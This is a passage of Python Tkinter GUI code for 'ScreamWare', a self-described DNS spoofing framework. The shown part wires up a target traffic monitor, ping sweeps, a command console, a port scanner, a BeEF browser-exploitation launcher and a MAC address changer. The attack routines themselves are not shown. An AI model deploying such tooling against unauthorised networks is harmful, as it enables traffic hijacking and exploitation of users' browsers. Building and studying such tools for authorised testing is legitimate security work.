                       command=lambda k=key, v=var: update_cleanup_option(k, v.get()),
                       fg="white", bg="#1e1e1e", selectcolor="#1e1e1e",
                       font=("Arial", 9))
    cb.grid(row=i//2, column=(i%2), sticky="w", padx=5, pady=2)

# Cleanup buttons
cleanup_buttons = tk.Frame(cleanup_controls, bg="#1e1e1e")
cleanup_buttons.pack(fill=tk.X, pady=10)

tk.Button(cleanup_buttons, text="Manual Cleanup", command=perform_cleanup,
          bg="#ff6b35", fg="white", font=("Arial", 10, "bold"), padx=15, pady=5).pack(side=tk.LEFT, padx=5)
tk.Button(cleanup_buttons, text="Enhanced Cleanup", command=enhanced_cleanup,
          bg="#d32f2f", fg="white", font=("Arial", 10, "bold"), padx=15, pady=5).pack(side=tk.LEFT, padx=5)
tk.Button(cleanup_buttons, text="Save Settings", command=save_cleanup_settings,
          bg="#444", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)

def update_cleanup_option(key, value):
    """Update cleanup configuration"""
    cleanup_config[key] = value
    log_output(f"🔧 Cleanup option '{key}': {'enabled' if value else 'disabled'}", "info")

def update_traffic_display():
    """Update traffic monitor display"""
    if not traffic_monitor_active:
        return

    # Update traffic log display
    try:
        traffic_text.delete(1.0, tk.END)
        for entry in traffic_log[-10:]:  # Show last 10 entries
            timestamp = entry['timestamp'].strftime("%H:%M:%S")
            line = f"[{timestamp}] {entry['target']} → {entry['domain']} ({entry['status']})\n"
            traffic_text.insert(tk.END, line, entry['status'])
    except Exception as e:
        log_output(f"❌ Error updating traffic display: {e}", "error")

    # Update target status tree
    try:
        # Clear existing items
        for item in target_status_tree.get_children():
            target_status_tree.delete(item)

        # Add current target
        current_target = target_entry.get().strip()
        if current_target:
            status_info = get_target_status(current_target)
            target_status_tree.insert("", "end", text=current_target,
                                     values=(status_info["status"], status_info["last_activity"],
                                           stats["target_activity"].get(current_target, 0)))

        # Add discovered hosts
        for host in scan_results:
            if host["ip"] != current_target:
                status_info = get_target_status(host["ip"])
                target_status_tree.insert("", "end", text=host["ip"],
                                         values=(status_info["status"], status_info["last_activity"],
                                               stats["target_activity"].get(host["ip"], 0)))

    except Exception as e:
        log_output(f"❌ Error updating target status: {e}", "error")

    # Update statistics
    update_statistics_display()

    # Schedule next update
    root.after(2000, update_traffic_display)  # Update every 2 seconds

# Start the display update loop
root.after(3000, update_traffic_display)  # Start after 3 seconds

# Configure traffic text tags
traffic_text.tag_configure("success", foreground="#4ade80")
traffic_text.tag_configure("failed", foreground="#f87171")

# ---- Ping Tab ----
ping_frame = tk.Frame(ping_tab, bg="#1e1e1e")
ping_frame.pack(padx=20, pady=10, fill=tk.BOTH, expand=True)

# Single Ping Section
single_ping_frame = tk.LabelFrame(ping_frame, text="🎯 Single Host Ping", fg="white", bg="#1e1e1e", font=("Arial", 12, "bold"))
single_ping_frame.pack(fill=tk.X, pady=10)

single_ping_controls = tk.Frame(single_ping_frame, bg="#1e1e1e")
single_ping_controls.pack(padx=10, pady=10)

tk.Label(single_ping_controls, text="Host/IP:", fg="white", bg="#1e1e1e", font=("Arial", 10)).pack(side=tk.LEFT, padx=(0, 10))

single_host_entry = tk.Entry(single_ping_controls, width=20, bg="#333", fg="white", insertbackground="white", font=("Arial", 10))
single_host_entry.pack(side=tk.LEFT, padx=(0, 10))
single_host_entry.insert(0, "8.8.8.8")

tk.Label(single_ping_controls, text="Count:", fg="white", bg="#1e1e1e", font=("Arial", 10)).pack(side=tk.LEFT, padx=(0, 5))

ping_count_var = tk.StringVar(value="4")
ping_count_combo = ttk.Combobox(single_ping_controls, textvariable=ping_count_var, values=["1", "4", "10", "25"], width=5, state="readonly")
ping_count_combo.pack(side=tk.LEFT, padx=(0, 10))

tk.Button(single_ping_controls, text="Ping", command=lambda: execute_single_ping(), bg="#0a7e3d", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)
tk.Button(single_ping_controls, text="Continuous", command=lambda: start_continuous_ping(), bg="#ff6b35", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)
tk.Button(single_ping_controls, text="Stop", command=lambda: stop_continuous_ping(), bg="#d32f2f", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)

# Ping Sweep Section
sweep_frame = tk.LabelFrame(ping_frame, text="🔍 Network Ping Sweep", fg="white", bg="#1e1e1e", font=("Arial", 12, "bold"))
sweep_frame.pack(fill=tk.X, pady=10)

sweep_controls = tk.Frame(sweep_frame, bg="#1e1e1e")
sweep_controls.pack(padx=10, pady=10)

tk.Label(sweep_controls, text="Network Range:", fg="white", bg="#1e1e1e", font=("Arial", 10)).pack(side=tk.LEFT, padx=(0, 10))

sweep_range_entry = tk.Entry(sweep_controls, width=20, bg="#333", fg="white", insertbackground="white", font=("Arial", 10))
sweep_range_entry.pack(side=tk.LEFT, padx=(0, 10))
sweep_range_entry.insert(0, "192.168.1.0/24")

tk.Button(sweep_controls, text="Start Sweep", command=lambda: execute_ping_sweep(), bg="#0a7e3d", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)
tk.Button(sweep_controls, text="Stop All", command=lambda: stop_all_pings(), bg="#d32f2f", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)

# Ping Statistics Section
stats_frame = tk.LabelFrame(ping_frame, text="📊 Ping Statistics", fg="white", bg="#1e1e1e", font=("Arial", 12, "bold"))
stats_frame.pack(fill=tk.X, pady=10)

stats_grid = tk.Frame(stats_frame, bg="#1e1e1e")
stats_grid.pack(padx=10, pady=10)

ping_stats_items = [
    ("Total Pings:", "total", "📡"),
    ("Successful:", "successful", "✅"),
    ("Failed:", "failed", "❌"),
    ("Avg Response:", "avg", "⏱️"),
    ("Min Response:", "min", "⬇️"),
    ("Max Response:", "max", "⬆️")
]

# Store ping stat labels for updating
ping_stat_labels = {}

for i, (label_text, key, icon) in enumerate(ping_stats_items):
    row = i // 3
    col = (i % 3) * 2

    label = tk.Label(stats_grid, text=f"{icon} {label_text}", fg="white", bg="#1e1e1e", font=("Arial", 10))
    label.grid(row=row, column=col, sticky="w", padx=5, pady=2)

    value_label = tk.Label(stats_grid, text="0", fg="#4ade80", bg="#1e1e1e", font=("Arial", 10, "bold"))
    value_label.grid(row=row, column=col+1, sticky="w", padx=5, pady=2)
    ping_stat_labels[key] = value_label

# Results Display Section
results_frame = tk.LabelFrame(ping_frame, text="📋 Ping Results", fg="white", bg="#1e1e1e", font=("Arial", 12, "bold"))
results_frame.pack(fill=tk.BOTH, expand=True, pady=10)

results_controls = tk.Frame(results_frame, bg="#1e1e1e")
results_controls.pack(padx=10, pady=5)

tk.Button(results_controls, text="Clear Results", command=lambda: clear_ping_results(), bg="#666", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)
tk.Button(results_controls, text="Export Results", command=lambda: export_ping_results(), bg="#444", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)

# Ping results display
ping_results_text = scrolledtext.ScrolledText(results_frame, height=15, bg="#0d1117", fg="#c9d1d9", font=("Courier", 9), wrap=tk.WORD, relief=tk.SUNKEN, bd=2)
ping_results_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

# Configure ping result tags
ping_results_text.tag_configure("success", foreground="#4ade80")
ping_results_text.tag_configure("failed", foreground="#f87171")
ping_results_text.tag_configure("warning", foreground="#fbbf24")
ping_results_text.tag_configure("info", foreground="#60a5fa")

# Ping tab functions
def execute_single_ping():
    """Execute a single ping command"""
    host = single_host_entry.get().strip()
    count = int(ping_count_var.get())

    if not host:
        messagebox.showwarning("No Host", "Please enter a host or IP address.", parent=root)
        return

    if not validate_ip(host):
        # Try to resolve hostname
        try:
            import socket
            socket.gethostbyname(host)
        except:
            messagebox.showwarning("Invalid Host", f"Could not resolve hostname: {host}", parent=root)
            return

    log_output(f"🎯 Pinging {host} ({count} packets)", "info")

    def ping_thread():
        result = ping_host(host, count=count)
        ping_history.append(result)
        update_ping_stats(result)
        display_ping_result(result)

    threading.Thread(target=ping_thread, daemon=True).start()

def start_continuous_ping():
    """Start continuous ping monitoring"""
    global continuous_ping_active
    host = single_host_entry.get().strip()

    if not host:
        messagebox.showwarning("No Host", "Please enter a host or IP address.", parent=root)
        return

    if continuous_ping_active:
        messagebox.showinfo("Already Running", "Continuous ping is already active.", parent=root)
        return

    continuous_ping_active = True
    log_output(f"🔄 Starting continuous ping to {host}", "info")

    def ping_callback(result):
        display_ping_result(result)
        update_ping_display()

    continuous_ping_monitor(host, ping_callback)

def stop_continuous_ping():
    """Stop continuous ping monitoring"""
    global continuous_ping_active
    continuous_ping_active = False
    log_output("⏹️ Continuous ping stopped", "info")

def execute_ping_sweep():
    """Execute a ping sweep of a network range"""
    network_range = sweep_range_entry.get().strip()

    if not network_range:
        messagebox.showwarning("No Range", "Please enter a network range (e.g., 192.168.1.0/24).", parent=root)
        return

    # Clear previous results
    ping_results_text.delete(1.0, tk.END)

    def sweep_callback(result):
        display_ping_result(result)

    # Run ping sweep in thread
    threading.Thread(target=ping_sweep, args=(network_range, sweep_callback), daemon=True).start()

def display_ping_result(result):
    """Display a ping result in the results text widget"""
    timestamp = datetime.now().strftime("%H:%M:%S")

    if result["success"]:
        if result["response_time"]:
            line = f"[{timestamp}] ✅ {result['host']} - {result['response_time']:.2f}ms (Loss: {result.get('packet_loss', 0)}%)\n"
            tag = "success"
        else:
            line = f"[{timestamp}] ✅ {result['host']} - UP (No response time)\n"
            tag = "success"
    else:
        line = f"[{timestamp}] ❌ {result['host']} - {result.get('error', 'Unknown error')}\n"
        tag = "failed"

    ping_results_text.insert(tk.END, line, tag)
    ping_results_text.see(tk.END)

def update_ping_display():
    """Update ping statistics display"""
    try:
        # Update statistics labels
        ping_stat_labels["total"].config(text=str(ping_stats["total_pings"]))
        ping_stat_labels["successful"].config(text=str(ping_stats["successful"]))
        ping_stat_labels["failed"].config(text=str(ping_stats["failed"]))

        if ping_stats["avg_response"] > 0:
            ping_stat_labels["avg"].config(text=f"{ping_stats['avg_response']:.2f}ms")
        else:
            ping_stat_labels["avg"].config(text="N/A")

        if ping_stats["min_response"] != float('inf'):
            ping_stat_labels["min"].config(text=f"{ping_stats['min_response']:.2f}ms")
        else:
            ping_stat_labels["min"].config(text="N/A")

        if ping_stats["max_response"] > 0:
            ping_stat_labels["max"].config(text=f"{ping_stats['max_response']:.2f}ms")
        else:
            ping_stat_labels["max"].config(text="N/A")

    except Exception as e:
        log_output(f"❌ Error updating ping display: {e}", "error")

    # Schedule next update
    if continuous_ping_active:
        root.after(1000, update_ping_display)

def clear_ping_results():
    """Clear ping results and reset statistics"""
    ping_results_text.delete(1.0, tk.END)
    global ping_stats, ping_history
    ping_stats = {
        "total_pings": 0,
        "successful": 0,
        "failed": 0,
        "avg_response": 0,
        "min_response": float('inf'),
        "max_response": 0
    }
    ping_history.clear()
    update_ping_display()
    log_output("🧹 Ping results cleared", "info")

# Start ping display update loop
root.after(2000, update_ping_display)

# ---- Console Tab ----
console_frame = tk.Frame(console_tab, bg="#1e1e1e")
console_frame.pack(padx=20, pady=10, fill=tk.BOTH, expand=True)

# Console input section
console_input_frame = tk.LabelFrame(console_frame, text="💻 Command Console", fg="white", bg="#1e1e1e", font=("Arial", 12, "bold"))
console_input_frame.pack(fill=tk.X, pady=10)

console_input_container = tk.Frame(console_input_frame, bg="#1e1e1e")
console_input_container.pack(padx=10, pady=10, fill=tk.X)

tk.Label(console_input_container, text="Command:", fg="white", bg="#1e1e1e", font=("Arial", 10)).pack(side=tk.LEFT, padx=(0, 10))

console_command_entry = tk.Entry(console_input_container, width=60, bg="#333", fg="white", insertbackground="white", font=("Courier", 10))
console_command_entry.pack(side=tk.LEFT, padx=(0, 10), fill=tk.X, expand=True)
console_command_entry.bind("<Return>", lambda e: execute_console_command())

tk.Button(console_input_container, text="Execute", command=execute_console_command, bg="#0a7e3d", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)
tk.Button(console_input_container, text="Clear", command=lambda: console_output.delete(1.0, tk.END), bg="#666", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)

# Kali commands section
kali_commands_frame = tk.LabelFrame(console_frame, text="⚡ Kali Linux Commands", fg="white", bg="#1e1e1e", font=("Arial", 12, "bold"))
kali_commands_frame.pack(fill=tk.X, pady=10)

kali_commands_container = tk.Frame(kali_commands_frame, bg="#1e1e1e")
kali_commands_container.pack(padx=10, pady=10, fill=tk.X)

# Command selector
kali_commands_var = tk.StringVar()
kali_commands_combo = ttk.Combobox(kali_commands_container, textvariable=kali_commands_var, values=get_kali_commands(), width=80, state="readonly")
kali_commands_combo.pack(side=tk.LEFT, padx=(0, 10), fill=tk.X, expand=True)

tk.Button(kali_commands_container, text="Use Command", command=lambda: use_kali_command(), bg="#ff6b35", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)
tk.Button(kali_commands_container, text="⭐ Add to Favorites", command=lambda: add_to_favorites(kali_commands_var.get()), bg="#444", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)

# Console output
console_output_frame = tk.LabelFrame(console_frame, text="📋 Console Output", fg="white", bg="#1e1e1e", font=("Arial", 12, "bold"))
console_output_frame.pack(fill=tk.BOTH, expand=True, pady=10)

console_output_controls = tk.Frame(console_output_frame, bg="#1e1e1e")
console_output_controls.pack(padx=10, pady=5)

tk.Button(console_output_controls, text="Clear History", command=clear_console_history, bg="#666", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)
tk.Button(console_output_controls, text="Save History", command=save_command_history, bg="#444", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)

console_output = scrolledtext.ScrolledText(console_output_frame, height=20, bg="#0d1117", fg="#c9d1d9", font=("Courier", 9), wrap=tk.WORD, relief=tk.SUNKEN, bd=2)
console_output.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

# Configure console output tags
console_output.tag_configure("command", foreground="#60a5fa")
console_output.tag_configure("output", foreground="#e5e7eb")
console_output.tag_configure("error", foreground="#f87171")
console_output.tag_configure("success", foreground="#4ade80")

# ---- MISC Tab ----
misc_frame = tk.Frame(misc_tab, bg="#1e1e1e")
misc_frame.pack(padx=20, pady=10, fill=tk.BOTH, expand=True)

# Port Scanner Section
port_scan_frame = tk.LabelFrame(misc_frame, text="🔍 Port Scanner", fg="white", bg="#1e1e1e", font=("Arial", 12, "bold"))
port_scan_frame.pack(fill=tk.X, pady=10)

port_scan_controls = tk.Frame(port_scan_frame, bg="#1e1e1e")
port_scan_controls.pack(padx=10, pady=10)

tk.Label(port_scan_controls, text="Target:", fg="white", bg="#1e1e1e", font=("Arial", 10)).pack(side=tk.LEFT, padx=(0, 10))

port_target_entry = tk.Entry(port_scan_controls, width=20, bg="#333", fg="white", insertbackground="white", font=("Arial", 10))
port_target_entry.pack(side=tk.LEFT, padx=(0, 10))
port_target_entry.insert(0, "127.0.0.1")

tk.Label(port_scan_controls, text="Ports:", fg="white", bg="#1e1e1e", font=("Arial", 10)).pack(side=tk.LEFT, padx=(0, 5))

port_range_entry = tk.Entry(port_scan_controls, width=15, bg="#333", fg="white", insertbackground="white", font=("Arial", 10))
port_range_entry.pack(side=tk.LEFT, padx=(0, 10))
port_range_entry.insert(0, "1-1000")

tk.Label(port_scan_controls, text="Type:", fg="white", bg="#1e1e1e", font=("Arial", 10)).pack(side=tk.LEFT, padx=(0, 5))

scan_type_var = tk.StringVar(value="tcp")
scan_type_combo = ttk.Combobox(port_scan_controls, textvariable=scan_type_var, values=["tcp", "udp", "syn"], width=8, state="readonly")
scan_type_combo.pack(side=tk.LEFT, padx=(0, 10))

tk.Button(port_scan_controls, text="Scan", command=execute_port_scan, bg="#0a7e3d", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)

# Port scan results
port_results_frame = tk.Frame(port_scan_frame, bg="#1e1e1e")
port_results_frame.pack(fill=tk.X, padx=10, pady=5)

port_results_text = scrolledtext.ScrolledText(port_results_frame, height=8, bg="#0d1117", fg="#c9d1d9", font=("Courier", 9), wrap=tk.WORD, relief=tk.SUNKEN, bd=2)
port_results_text.pack(fill=tk.X, padx=5, pady=5)

# WHOIS Section
whois_frame = tk.LabelFrame(misc_frame, text="🌐 WHOIS Lookup", fg="white", bg="#1e1e1e", font=("Arial", 12, "bold"))
whois_frame.pack(fill=tk.X, pady=10)

whois_controls = tk.Frame(whois_frame, bg="#1e1e1e")
whois_controls.pack(padx=10, pady=10)

tk.Label(whois_controls, text="Domain:", fg="white", bg="#1e1e1e", font=("Arial", 10)).pack(side=tk.LEFT, padx=(0, 10))

whois_domain_entry = tk.Entry(whois_controls, width=30, bg="#333", fg="white", insertbackground="white", font=("Arial", 10))
whois_domain_entry.pack(side=tk.LEFT, padx=(0, 10))
whois_domain_entry.insert(0, "example.com")

tk.Button(whois_controls, text="Lookup", command=execute_whois, bg="#0a7e3d", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)

# WHOIS results
whois_results_text = scrolledtext.ScrolledText(whois_frame, height=8, bg="#0d1117", fg="#c9d1d9", font=("Courier", 9), wrap=tk.WORD, relief=tk.SUNKEN, bd=2)
whois_results_text.pack(fill=tk.X, padx=10, pady=5)

# DNS Lookup Section
dns_frame = tk.LabelFrame(misc_frame, text="🔎 DNS Lookup", fg="white", bg="#1e1e1e", font=("Arial", 12, "bold"))
dns_frame.pack(fill=tk.X, pady=10)

dns_controls = tk.Frame(dns_frame, bg="#1e1e1e")
dns_controls.pack(padx=10, pady=10)

tk.Label(dns_controls, text="Domain:", fg="white", bg="#1e1e1e", font=("Arial", 10)).pack(side=tk.LEFT, padx=(0, 10))

dns_domain_entry = tk.Entry(dns_controls, width=25, bg="#333", fg="white", insertbackground="white", font=("Arial", 10))
dns_domain_entry.pack(side=tk.LEFT, padx=(0, 10))
dns_domain_entry.insert(0, "example.com")

tk.Label(dns_controls, text="Record:", fg="white", bg="#1e1e1e", font=("Arial", 10)).pack(side=tk.LEFT, padx=(0, 5))

dns_record_var = tk.StringVar(value="A")
dns_record_combo = ttk.Combobox(dns_controls, textvariable=dns_record_var, values=["A", "AAAA", "MX", "NS", "TXT", "SOA", "CNAME"], width=8, state="readonly")
dns_record_combo.pack(side=tk.LEFT, padx=(0, 10))

tk.Button(dns_controls, text="Lookup", command=execute_dns_lookup, bg="#0a7e3d", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)

# DNS results
dns_results_text = scrolledtext.ScrolledText(dns_frame, height=6, bg="#0d1117", fg="#c9d1d9", font=("Courier", 9), wrap=tk.WORD, relief=tk.SUNKEN, bd=2)
dns_results_text.pack(fill=tk.X, padx=10, pady=5)

# Security Tools Section
security_frame = tk.LabelFrame(misc_frame, text="🥩 Security Tools", fg="white", bg="#1e1e1e", font=("Arial", 12, "bold"))
security_frame.pack(fill=tk.X, pady=10)

security_controls = tk.Frame(security_frame, bg="#1e1e1e")
security_controls.pack(padx=10, pady=10)

# BeEF Button
tk.Button(security_controls, text="🥩 Launch BeEF", command=launch_beef, bg="#d32f2f", fg="white", font=("Arial", 12, "bold"), padx=20, pady=8).pack(side=tk.LEFT, padx=5)

# BeEF status and info
beef_status_label = tk.Label(security_controls, text="Not Running", fg="#666", bg="#1e1e1e", font=("Arial", 10))
beef_status_label.pack(side=tk.LEFT, padx=10)

tk.Button(security_controls, text="Stop BeEF", command=stop_beef, bg="#666", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)

# BeEF info
beef_info_label = tk.Label(security_controls, text="BeEF-xss: Browser Exploitation Framework", fg="#999", bg="#1e1e1e", font=("Arial", 9))
beef_info_label.pack(side=tk.LEFT, padx=10)

# MAC Changer Section
mac_frame = tk.LabelFrame(misc_frame, text="🔧 MAC Address Changer (Linux)", fg="white", bg="#1e1e1e", font=("Arial", 12, "bold"))
mac_frame.pack(fill=tk.X, pady=10)

mac_controls = tk.Frame(mac_frame, bg="#1e1e1e")
mac_controls.pack(padx=10, pady=10)

tk.Label(mac_controls, text="Interface:", fg="white", bg="#1e1e1e", font=("Arial", 10)).pack(side=tk.LEFT, padx=(0, 10))

mac_interface_var = tk.StringVar(value="eth0")
mac_interface_combo = ttk.Combobox(mac_controls, textvariable=mac_interface_var, values=["eth0", "wlan0", "wlan1", "lo"], width=10, state="readonly")
mac_interface_combo.pack(side=tk.LEFT, padx=(0, 10))

tk.Label(mac_controls, text="New MAC:", fg="white", bg="#1e1e1e", font=("Arial", 10)).pack(side=tk.LEFT, padx=(0, 5))

mac_entry = tk.Entry(mac_controls, width=20, bg="#333", fg="white", insertbackground="white", font=("Arial", 10))
mac_entry.pack(side=tk.LEFT, padx=(0, 10))
mac_entry.insert(0, "00:11:22:33:44:55")

tk.Button(mac_controls, text="Change MAC", command=execute_mac_change, bg="#ff6b35", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)

# MAC status
mac_status_label = tk.Label(mac_controls, text="Ready", fg="#4ade80", bg="#1e1e1e", font=("Arial", 10))
mac_status_label.pack(side=tk.LEFT, padx=10)


# ---- Credits Tab ----
credits_frame = tk.Frame(credits_tab, bg="#1e1e1e")
credits_frame.pack(padx=20, pady=10, fill=tk.BOTH, expand=True)

# Main Credits Container
credits_main = tk.Frame(credits_frame, bg="#1e1e1e")
credits_main.pack(expand=True, fill=tk.BOTH)

# Title Section
title_section = tk.Frame(credits_main, bg="#1e1e1e")
title_section.pack(pady=(0, 30))

# ScreamWare Title
screamware_title = tk.Label(title_section, text="🎭 ScreamWare",
                           fg="#ff6b6b", bg="#1e1e1e",
                           font=("Arial", 28, "bold"))
screamware_title.pack()

subtitle = tk.Label(title_section, text="DNS Spoofing Framework",
                   fg="#8892b0", bg="#1e1e1e",
                   font=("Arial", 14))
subtitle.pack()

# Creator Section
creator_section = tk.Frame(credits_main, bg="#2a2a2a", relief=tk.RIDGE, bd=2)
creator_section.pack(pady=20, padx=50, fill=tk.X)

# Creator Info Container
creator_info = tk.Frame(creator_section, bg="#2a2a2a")
creator_info.pack(pady=20)

# Creator Label
creator_label = tk.Label(creator_info, text="👨‍💻 Creator",
                        fg="#64ffda", bg="#2a2a2a",
                        font=("Arial", 16, "bold"))
creator_label.pack(pady=(0, 10))

# Creator Name
creator_name = tk.Label(creator_info, text="ScreamsTerror",
                       fg="#ffffff", bg="#2a2a2a",
                       font=("Arial", 20, "bold"))
creator_name.pack(pady=(0, 5))

# Creator Title
creator_title = tk.Label(creator_info, text="Cybersecurity Researcher & Penetration Testing Tools Developer",
                        fg="#8892b0", bg="#2a2a2a",
                        font=("Arial", 11))
creator_title.pack(pady=(0, 10))

# Photo Section
photo_section = tk.Frame(creator_info, bg="#2a2a2a")
photo_section.pack(pady=10)

# Photo Placeholder (you can replace this with your actual photo)
def add_creator_photo():
    """Add creator photo - you can replace this with your actual photo file"""
    try:
        # Try to load a photo file named "creator_photo.png" from the same directory
        photo_path = os.path.join(os.path.dirname(__file__), "creator_photo.png")
        if os.path.exists(photo_path):
            from PIL import Image, ImageTk
            image = Image.open(photo_path)
            image = image.resize((150, 150), Image.Resampling.LANCZOS)
            photo = ImageTk.PhotoImage(image)

            photo_label = tk.Label(photo_section, image=photo, bg="#2a2a2a")
            photo_label.image = photo  # Keep a reference
            photo_label.pack()
        else:
            # Show placeholder if no photo found
            placeholder_label = tk.Label(photo_section,
                                       text="📷\nAdd your photo\n(save as 'creator_photo.png')",
                                       fg="#8892b0", bg="#3a3a3a",
                                       font=("Arial", 10),
                                       width=15, height=8,
                                       relief=tk.SUNKEN, bd=2)
            placeholder_label.pack()
    except Exception as e:
        # Show placeholder if there's an error loading photo
        placeholder_label = tk.Label(photo_section,
                                   text="📷\nPhoto loading failed",
                                   fg="#ff6b6b", bg="#3a3a3a",
                                   font=("Arial", 10),
                                   width=15, height=8,
                                   relief=tk.SUNKEN, bd=2)
        placeholder_label.pack()

add_creator_photo()

# Version Info
version_frame = tk.Frame(credits_main, bg="#1e1e1e")
version_frame.pack(pady=10)

version_label = tk.Label(version_frame, text="Version 2.0 - Enhanced Edition",
                        fg="#8892b0", bg="#1e1e1e",
                        font=("Arial", 12, "italic"))
version_label.pack()

# Features Section - Enhanced and Visible
features_section = tk.Frame(credits_main, bg="#2a2a2a", relief=tk.RIDGE, bd=2)
features_section.pack(pady=20, padx=30, fill=tk.BOTH, expand=True)

# Features title
features_title = tk.Label(features_section, text="✨ Key Features",
                         fg="#00d4ff", bg="#2a2a2a",
                         font=("Arial", 18, "bold"))
features_title.pack(pady=(15, 20))

# Create scrollable frame for features
canvas = tk.Canvas(features_section, bg="#2a2a2a", highlightthickness=0)
scrollbar = tk.Scrollbar(features_section, orient="vertical", command=canvas.yview)
scrollable_frame = tk.Frame(canvas, bg="#2a2a2a")

scrollable_frame.bind(
    "<Configure>",
    lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
)

canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
canvas.configure(yscrollcommand=scrollbar.set)

# Feature cards data with colors
features_data = [
    ("🎯", "DNS Operations", "Advanced spoofing with intelligent targeting and real-time manipulation", "#ff6b6b"),
    ("🌐", "Web Management", "HTML template serving with Apache integration and preview functionality", "#4ecdc4"),
    ("🔍", "Network Discovery", "Interface detection and comprehensive network scanning capabilities", "#45b7d1"),
    ("📊", "Real-time Monitoring", "Live statistics tracking and comprehensive traffic analysis dashboard", "#96ceb4"),
    ("🏓", "Network Testing", "Advanced ping tools with network connectivity analysis and reporting", "#ffeaa7"),
    ("💻", "Console Access", "Integrated Kali Linux command execution with favorites system", "#dda0dd"),
    ("🔧", "Security Tools", "Complete toolkit: Port scanner, WHOIS, DNS lookup, MAC address changer", "#ff8b94"),
    ("🥩", "BeEF Integration", "Browser Exploitation Framework integration for security testing", "#98fb98"),
    ("🎭", "Modern UI", "Professional dark theme with smooth animations and intuitive design", "#6c5ce7"),
    ("🖥️", "Cross-Platform", "Full compatibility across ,Linux, and macOS systems", "#a29bfe")
]

# Create feature cards
def create_feature_card(parent, icon, title, description, color, index):
    """Create a beautiful feature card"""
    card_frame = tk.Frame(parent, bg="#1e1e1e", relief=tk.RAISED, bd=1)
    card_frame.pack(pady=8, padx=15, fill=tk.X)

    # Card content
    content_frame = tk.Frame(card_frame, bg="#1e1e1e")
    content_frame.pack(pady=12, padx=15, fill=tk.X)

    # Icon
    icon_label = tk.Label(content_frame, text=icon,
                         font=("Arial", 20),
                         fg=color, bg="#1e1e1e")
    icon_label.grid(row=0, column=0, sticky="w", padx=(0, 10))

    # Title and description
    text_frame = tk.Frame(content_frame, bg="#1e1e1e")
    text_frame.grid(row=0, column=1, sticky="ew", padx=(0, 10))

    title_label = tk.Label(text_frame, text=title,
                          font=("Arial", 12, "bold"),
                          fg="#ffffff", bg="#1e1e1e",
                          anchor="w")
    title_label.pack(fill=tk.X, pady=(0, 3))

    desc_label = tk.Label(text_frame, text=description,
                         font=("Arial", 9),
                         fg="#8892b0", bg="#1e1e1e",
                         anchor="w", wraplength=400, justify="left")
    desc_label.pack(fill=tk.X)

    # Configure grid weights
    content_frame.columnconfigure(1, weight=1)

    # Add hover effect
    def on_enter(e):
        card_frame.config(bg=color, relief=tk.RAISED, bd=2)
        content_frame.config(bg=color)
        icon_label.config(bg=color)
        text_frame.config(bg=color)
        title_label.config(bg=color)
        desc_label.config(bg=color)

    def on_leave(e):
        card_frame.config(bg="#1e1e1e", relief=tk.RAISED, bd=1)
        content_frame.config(bg="#1e1e1e")
        icon_label.config(bg="#1e1e1e")
        text_frame.config(bg="#1e1e1e")
        title_label.config(bg="#1e1e1e")
        desc_label.config(bg="#1e1e1e")

    # Bind hover effects
    card_frame.bind("<Enter>", on_enter)
    content_frame.bind("<Enter>", on_enter)
    icon_label.bind("<Enter>", on_enter)
    text_frame.bind("<Enter>", on_enter)
    title_label.bind("<Enter>", on_enter)
    desc_label.bind("<Enter>", on_enter)

    card_frame.bind("<Leave>", on_leave)
    content_frame.bind("<Leave>", on_leave)
    icon_label.bind("<Leave>", on_leave)
    text_frame.bind("<Leave>", on_leave)
    title_label.bind("<Leave>", on_leave)
    desc_label.bind("<Leave>", on_leave)

# Create all feature cards
for i, (icon, title, description, color) in enumerate(features_data):
    create_feature_card(scrollable_frame, icon, title, description, color, i)

# Pack canvas and scrollbar
canvas.pack(side="left", fill="both", expand=True, padx=(15, 0))
scrollbar.pack(side="right", fill="y", padx=(0, 15))

# Footer label
footer_label = tk.Label(features_section,
                       text="Enhanced Features Engine v2.0 • Interactive Design",
                       fg="#6b7280", bg="#2a2a2a",
                       font=("Arial", 9, "italic"))
footer_label.pack(pady=(10, 15))

# Contact/Info Section
contact_section = tk.Frame(credits_main, bg="#1e1e1e")
contact_section.pack(pady=10)

info_label = tk.Label(contact_section,
                     text="⚠️ For educational and authorized penetration testing purposes only",
                     fg="#fbbf24", bg="#1e1e1e",
                     font=("Arial", 10, "italic"))
info_label.pack()

copyright_label = tk.Label(contact_section,
                          text="© 2025 ScreamsTerror - All Rights Reserved",
                          fg="#6b7280", bg="#1e1e1e",
                          font=("Arial", 9))
copyright_label.pack(pady=(5, 0))

# ---- final initialization ----
# Auto-detect interface IP and network configuration
current_ip = get_interface_ip(iface_var.get())
if current_ip:
    spoof_ip_entry.insert(0, current_ip)
    log_output(f"🔧 Auto-detected interface IP: {current_ip}", "info")

# Auto-detect network configuration on startup
log_output("🔍 Auto-detecting network configuration...", "info")
network_info = auto_populate_network_fields()

# Try to load config
load_config()
